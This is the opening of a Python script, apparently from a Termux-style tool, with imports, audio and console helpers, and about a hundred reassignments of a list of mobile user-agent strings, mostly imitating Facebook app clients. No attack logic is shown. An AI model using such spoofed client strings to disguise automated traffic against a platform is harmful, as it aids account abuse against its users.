
#-----------------[ Import Module ]-------------------#
import requests,bs4,json,os,sys,random,datetime,time,re,getpass
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import urllib3,rich,base64
#os.system ('termux-setup-storage -y')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import pretty
from rich.text import Text as tekz
from time import localtime as lt
pretty.install()
CON=sol()
import requests,re
#==============={ PLAY AUDIO MODULES }================#
def create_audio(text,file):
    from gtts import gTTS
    my_a = gTTS(text)
    my_a.save(file)
def play_audio(audio_file):
    from os import system as cmd
    try:
        cmd("play-audio "+audio_file)
    except:
        pass
pretty.install()
CON=sol()


#------------------[ MACHINE-SUPPORT ]---------------#
 
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
    os.system('clear')
def back():
    login()
def contact():
   
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)


#------------------[ Opening part]-------------------#
import os, platform, time, sys
#------------------[ USER-AGENT ]-------------------#
ua = ['Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',]
ua = ['Mozilla/5.0 (Linux; Android 8.0.0; SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.111 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 10; Redmi 5 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.96 Mobile Safari/537.36",]
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200H Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/238.0.0.41.116;]']
ua = ['Mozilla/5.0 (Linux; Android 5.1.1; SM-J200G Build/LMY47X; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/56.0.2924.87 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]']
ua = ['Mozilla/5.0 (Linux; Android 10; MAR-LX1A Build/HUAWEIMAR-L01A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/423.0.0.21.64;]']
ua = ['Mozilla/5.0 (Linux; Android 12; MP17 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ['Mozilla/5.0 (Linux; Android 12; 22122RK93C Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]']
ua = ['Mozilla/5.0 (Linux; Android 9; MAR-LX1A Build/HUAWEIMAR-L21A; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.163 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]']
ua = ["Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19D52",]
ua = ["Mozilla/5.0 (Linux; Android 8.0.0; SM-J330G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.58 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/98.0.4758.101 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 11; moto g(40) fusion Build/RRI31.Q1-42-51-12; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 6.0; CAM-UL00 Build/HONORCAM-UL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]",]
ua = ["Mozilla/5.0 (Linux; Android 6.0.1; SM-J700M Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]",]
ua = ["Mozilla/5.0 (Linux; Android 8.1.0; SM-J710F Build/M1AJQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/109.0.5414.86 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/391.1.0.37.104;]",]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 7.0; MS50L Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]",]
ua = ['Mozilla/5.0 (Linux; Android 5.0.2; HTC Desire Eye Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/95.0.4638.74 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/351.1.0.12.114;]']
ua = ['Mozilla/5.0 (Linux; Android 11; V1936A Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/326.9.0.13.112;]']
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]']
ua = ['Mozilla/5.0 (Linux; U; Android 2.3.4; en-gb; Nokia N900 Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',]
ua = ['Mozilla/5.0 (X11; U; Linux armv7l; ru-RU; rv:1.9.2a1pre) Gecko/20091127 Firefox/3.5 Maemo Browser 1.5.6 RX-51 N900',]
ua = ['Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 NokiaN97-4/11.0.105; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) BrowserNG/7.1.4',]
ua = ['Mozilla/5.0 (Symbian/3; U; Series60/5.2; Nokia XpressMusic; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba.',]
ua = ['Mozilla/5.0 (Linux; U; Android 2.0.1; en-us; Droid Build/ESD56) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Mobile Safari/530.17',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Hello 7Q Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30.',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 7; Nokia E72 Build/TD2A.743743.204) [FBAN/FB4A;FBAV/131.0.0.25435;FBBV/639990627;FBRV/0;FBPN/com.facebook.mlite;FBLC/fi_FI;FBMF/E72;FBBD/E72;FBDV/Nokia E72;FBSV/7;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.75,width=720',]
ua = ['Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SonyEricssonX2/R3AA; Profile/MIDP-2.1; Configuration/CLDC-1.1; Windows Phone 6.5.3.5)',]
ua = ['Mozilla/5.0 (Linux; U; Android 4.0.4; hu-hu; SonyEricssonST15i Build/4.1.B.0.587) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30',]
ua = ['Mozilla/5.0 (Linux; Android 11; MT01 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.60 Safari/537.36 [FB_IAB/FB4A;FBAV/419.0.0.37.71;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; SO-02L Build/53.1.B.0.525; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/iris700; th-th) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.1.1.15962AP',]
ua = ['Mozilla/5.0 (Linux; Android 4.2.2; ru-ru; SAMSUNG GT-I9505/I9505XXUAMDC Build/JDQ39) AppleWebKit/535.19 (KHTML, like Gecko) Version/1.0 Chrome/18.0.1025.308 Mobile Safari/535.19',]
ua = ['Mozilla/5.0 (Linux; Android 4.4.2; GT-I9500 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.117 Mobile Safari/537.36 OPR/24.0.1565.82529',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G34 [FBAN/MessengerForiOS;FBAV/112.0.0.36.70;FBBV/54364624;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.3;FBSS/3;FBCR/',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/8.4.1;FBSS/3; FBCR/csl.;FBID/phone;FBLC/en_US;FBOP/5]',]
ua = ['Mozilla/5.0 (Linux; Android 9; SM-G955W Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.76 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; SM-G955F Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.57 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/410.0.0.17.85;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2043 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2043 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/393.0.0.35.106;]',]
ua = ['Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;',]
ua = ['Mozilla/5.0 (Linux; Android 11; DN2103 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/372.0.0.10.112;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/400.0.0.11.90;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/325.0.1.4.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; V2033 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/387.0.0.24.102;]',]
ua = ['Dalvik/2.1.0 (Linux; U; Android 8; Symphony i10 + Build/MY3USG) [FBAN/FB4A;FBAV/355.0.0.29257;FBBV/317556437;FBRV/0;FBPN/com.facebook.orca;FBLC/sl_SI;FBMF/i10 plus;FBBD/i10 plus;FBDV/Symphony i10 +;FBSV/8;FBCA/armeabi-v7a:armeabi;FBDM/{density=2.0,width=1200,height=1824};FB_FW/1;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.138 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/426.0.0.26.50;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.168 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/370.0.0.16.116;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 13; RMX3760 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/416.0.0.35.85;]',]
ua = ['Mozilla/5.0 (Linux; Android 8.1.0; vivo 1807 Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.110 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/375.1.0.28.111;]',]
ua = ['Mozilla/5.0 (Linux; Android 13; CPH2343 Build/TP1A.220624.003; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/412.0.0.22.115;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; Nokia 1 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.132 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/189.0.0.9.127;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Nokia 1 Plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 5.0; Nokia 105 Build/LRX21M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.93 Mobile Safari/537.36',]
ua = ["Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.85 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114",]
ua = ["Mozilla/5.0 (Linux; Android 11; 2107113SI) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.88 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 10; SM-A405FN Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 11; SM-A127F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108",]
ua = ["Mozilla/5.0 (Linux; Android 13; SM-S918B Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 12; SM-A115F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; CRT-LX2 Build/HONORCRT-L32; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 12; ANG-AN00 Build/HUAWEIANG-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/92.0.4515.105 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/396.1.0.28.104",]
ua = ["Mozilla/5.0 (Linux; Android 10; NEO-AL00 Build/HUAWEINEO-AL00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102",]
ua = ["Mozilla/5.0 (Linux; Android 13; Infinix X6710 Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/432.0.0.29.102;]",]
ua = ["Mozilla/5.0 (Linux; Android 12; Infinix X676B Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/433.0.0.31.111",]
ua = ["Mozilla/5.0 (Linux; Android 11; Infinix X6816D Build/RP1A.201005.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36[FBAN/EMA;FBLC/pl_PL;FBAV/373.1.0.8.104",]
ua = ["Mozilla/5.0 (Linux; Android 12; HarmonyOS; LNA-AL00; HMSCore 6.11.0.332) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.88 HuaweiBrowser/14.0.1.302 Mobile Safari/537.36",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C300 Build/SKQ1.220213.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108",]
ua = ["Mozilla/5.0 (Linux; Android 12; Nokia C110 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/427.0.0.31.63",]
ua = ['Mozilla/5.0 (Series40; Nokia5130c-2/07.91; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/2.0.2.68.14',]
ua = ['Mozilla/5.0 (Series40; Nokia306/03.81; Profile/MIDP-2.1 Configuration/CLDC-1.1) Gecko/20100401 S40OviBrowser/5.0.0.0.31',]
ua = ['Mozilla/5.0 (Java; U; ru; nokia500) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.5.0.185/82/352/UCWEB Mobile UNTRUSTED/1.0 3gpp-gba',]
ua = ['Mozilla/5.0 (Java; U; en-in; nokia502) UCBrowser8.2.1.144/69/444/UCWEB Mobile UNTRUSTED/1.0',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX3360 Build/RKQ1.210408.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3630 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/410.0.0.26.115;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX2156 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36[FBAN/EMA;FBLC/id_ID;FBAV/313.0.0.7.110;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX2193 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/101.0.4951.61 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX2163 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/367.0.0.24.107;',]
ua = ['Mozilla/5.0 (Linux; Android 10; RMX2050 Build/QKQ1.200209.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.93 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/417.0.0.33.65;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX3286 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/113.0.5672.162 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; Realme X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; RMX1931 Build/RKQ1.200928.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/94.0.4606.71 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/332.0.0.11.117;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; RMX2151 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/117.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/434.0.0.36.115;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; RMX2200 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/85.0.4183.127 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/431.0.0.30.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2; Xiaomi 10 Pro Build/MBFMIEK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 10; Redmi 01A Build/01AQKQ1.191014.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.101 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 11; 220233L2G Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36[FBAN/EMA;FBLC/fr_FR;FBAV/356.0.0.7.89;]',]
ua = ['Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4 Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.162 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/260.0.0.22.122;]',]
ua = ['Mozilla/5.0 (Linux; Android 6.0.1; Redmi 3X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]',]
ua = ['Mozilla/5.0 (Linux; Android 9; Redmi 6 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.154 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/403.0.0.27.81;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; Redmi 7 Build/QKQ1.191008.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/110.0.5481.153 Mobile Safari/537.36[FBAN/EMA;FBLC/pt_BR;FBAV/346.0.0.8.76;]',]
ua = ['Mozilla/5.0 (Linux; Android 10; M2006C3LG Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/428.0.0.26.108;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; 220733SG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/430.0.0.23.113;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; 220733SG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.166 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/367.0.0.7.52;]',]
ua = ['Mozilla/5.0 (Linux; Android 12; 220733SFG Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.196 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]',]
ua = ['Mozilla/5.0 (Linux; U; Android 13; tr-tr; Redmi Note 11 Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.127 Mobile Safari/537.36 XiaoMi/MiuiBrowser/13.28.0-gn',]
ua = ['Mozilla/5.0 (Linux; Android 7.1.2; Redmi Note 4A Build/N2G48H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.70 Mobile Safari/537.36',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/19G82 [FBAN/FBIOS;FBDV/iPhone8,1;FBMD/iPhone;FBSN/iOS;FBSV/15.6.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 iPhone9_1 BingWeb/6.9.10.0',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 16_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/20E252 [FBAN/FBIOS;FBDV/iPhone10,6;FBMD/iPhone;FBSN/iOS;FBSV/16.4.1;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5248v [FBAN/FBIOS;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5268h [FBAN/FBIOS;FBDV/iPhone13,2;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5326a [FBAN/FBIOS;FBDV/iPhone12,3;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/de_DE;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5277h [FBAN/FBIOS;FBDV/iPhone13,4;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5]',]
ua = ['Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/21A5277j [FBAN/FBIOS;FBDV/iPhone14,5;FBMD/iPhone;FBSN/iOS;FBSV/17.0;FBSS/3;FBID/phone;FBLC/it_IT;FBOP/5]',]
ua = ['Mozilla/5.0 (Linux; Android 11; Infinix X689 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/116.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/429.0.0.27.114;]',]
